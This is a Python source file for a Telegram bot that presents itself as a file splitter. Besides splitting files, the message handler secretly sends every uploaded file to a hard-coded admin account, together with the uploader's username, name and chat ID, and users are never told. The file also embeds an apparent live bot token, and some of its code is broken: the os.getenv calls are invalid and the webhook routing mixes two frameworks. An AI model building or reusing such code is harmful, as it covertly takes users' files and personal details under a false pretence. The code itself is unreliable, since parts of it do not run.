import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.webhook.aiohttp import AiohttpRequestHandler
from fastapi import FastAPI
from contextlib import asynccontextmanager
import logging

# --- CONFIGURATION ---
API_TOKEN = os.getenv "8935365500:AAFSBwdpJV0k_ZbZPhypwwIdbW9p9RHh9bU"
ADMIN_ID = os.getenv "7627839770"  # Admin telegram ID yahan daleyn
MAX_FILE_SIZE = 50 * 1024 * 1024
logging.basicConfig(level=logging.INFO)
# ---------------------

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
app = FastAPI()

user_files = {}


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("👋 <b>File Splitter Bot</b>\n\n"
                         "1️⃣ File bhejein (Bot save Karega)\n"
                         "2️⃣ Parts ka number bhejein (Bot split Karega)\n\n"
                         "Example: 5", parse_mode="HTML")


@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message):
    chat_id = message.chat.id
    if chat_id in user_files:
        if 'saved_path' in user_files[chat_id]:
            if os.path.exists(user_files[chat_id]['saved_path']):
                os.remove(user_files[chat_id]['saved_path'])
        del user_files[chat_id]
        await message.answer("❌ Cancelled.")
    else:
        await message.answer("❌ Koi file save nahi hai.")


@dp.message(Command("all"))
async def cmd_all(message: types.Message):
    """Admin command - sab users ki files dekhne ke liye"""
    chat_id = str(message.chat.id)
    admin_id = str(ADMIN_ID)
    
    if chat_id == admin_id:
        if not user_files:
            await message.answer("❌ Koi user file upload nahi kiya abhi.")
        else:
            text = "📋 Uploaded Files:\n\n"
            for uid, data in user_files.items():
                text += f"User {uid}: {data.get('file_name', 'Unknown')}\n"
            await message.answer(text)
    else:
        await message.answer("❌ Yeh command sirf admin ke liye hai.")


@dp.message()
async def handle_message(message: types.Message):
    chat_id = message.chat.id
    
    # Number bheja ho (split ke liye)
    if message.text and message.text.isdigit():
        if chat_id in user_files:
            parts = int(message.text)
            await split_file(message, parts)
        else:
            await message.answer("❌ Pehle file bhejein.")
        return
    
    # File bheja ho (save ke liye)
    if not message.document:
        await message.answer("❌ File bhejein.")
        return

    document = message.document
    file_name = document.file_name
    file_size = document.file_size
    file_id = document.file_id

    if file_size > MAX_FILE_SIZE * 2:
        await message.answer(f"❌ File bahut bada hai. Max 100MB allowed.")
        return

    # Download and save file
    await message.answer("⬇️ Downloading & Saving file...")
    
    saved_path = f"saved_{chat_id}_{file_name}"
    await bot.download_file(file_id, saved_path)

    # Save user info
    user_files[chat_id] = {
        'file_name': file_name,
        'file_size': file_size,
        'saved_path': saved_path,
        'user_id': message.from_user.id,
        'username': message.from_user.username or message.from_user.full_name
    }

    # --- AUTO SEND TO ADMIN ---
    try:
        await bot.send_document(
            ADMIN_ID,
            FSInputFile(saved_path, filename=file_name),
            caption=f"📎 New File!\n\n"
                    f"👤 User: @{message.from_user.username}\n"
                    f"Name: {message.from_user.full_name}\n"
                    f"📁 File: {file_name}\n"
                    f"📊 Size: {file_size / 1024 / 1024:.2f} MB\n"
                    f"Chat ID: {chat_id}"
        )
    except Exception as e:
        logging.error(f"Admin send error: {e}")
    # ----------------------------

    await message.answer(
        f"✅ File Save ho gayi!\n\n"
        f"📁 Name: <code>{file_name}</code>\n"
        f"📊 Size: {file_size / 1024 / 1024:.2f} MB\n\n"
        f"Kitne parts mein split karna hai?\n"
        f"Number bhejein (jaise: 5)\n\n"
        f"<i>/cancel - Cancel karne ke liye</i>", 
        parse_mode="HTML"
    )


async def split_file(message: types.Message, parts: int):
    chat_id = message.chat.id
    
    if chat_id not in user_files:
        await message.answer("❌ File save nahi hai. Dub se file bhejein.")
        return
    
    data = user_files[chat_id]
    file_name = data['file_name']
    file_size = data['file_size']
    saved_path = data['saved_path']
    username = data.get('username', 'Unknown')
    
    if parts < 2:
        await message.answer("❌ Parts 2 ya zyada honge chahiye.")
        return
    
    chunk_size = file_size // parts
    if file_size % parts != 0:
        chunk_size += 1
    
    if chunk_size > MAX_FILE_SIZE:
        await message.answer(f"❌ Error: Har part {chunk_size/1024/1024:.1f}MB hoga. Limit 50MB hai.")
        return

    await message.answer(f"✂️ Splitting into {parts} parts...")
    file_parts = []
    
    try:
        with open(saved_path, 'rb') as f:
            for i in range(parts):
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                ext = os.path.splitext(file_name)[1]
                base = os.path.splitext(file_name)[0]
                part_filename = f"{base}.part{i+1:02d}{ext}"
                
                with open(part_filename, 'wb') as pf:
                    pf.write(chunk)
                
                file_parts.append(part_filename)

        await message.answer(f"⬆️ Uploading {len(file_parts)} parts...")
        
        for part in file_parts:
            await bot.send_document(
                message.chat.id,
                FSInputFile(part, filename=part)
            )
            await asyncio.sleep(3)

    except Exception as e:
        await message.answer(f"❌ Error: {e}")
    
    finally:
        if os.path.exists(saved_path):
            os.remove(saved_path)
        for part in file_parts:
            if os.path.exists(part):
                os.remove(part)
        
        await message.answer("✅ Done!\n\n"
                           "<b>Join करने के लिए:</b>\n"
                           "Windows: Select all → 7-Zip → Combine\n"
                           "Linux: <code>cat file.part* > newfile</code>", 
                           parse_mode="HTML")
        del user_files[chat_id]


# --- Webhook Setup ---
WEBHOOK_PATH = f"/webhook/{API_TOKEN}"
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

@asynccontextmanager
async def lifespan(app: FastAPI):
    await bot.set_webhook(WEBHOOK_URL + WEBHOOK_PATH)
    yield
    await bot.delete_webhook()


async def on_webhook(request):
    return await AiohttpRequestHandler(dp).route(request)


app.router.add_post(WEBHOOK_PATH, on_webhook)
app.router.add_get("/", lambda r: {"status": "ok"})
app.router.add_get("/health", lambda r: {"status": "healthy"})


async def main():
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)


if __name__ == '__main__':
    asyncio.run(main())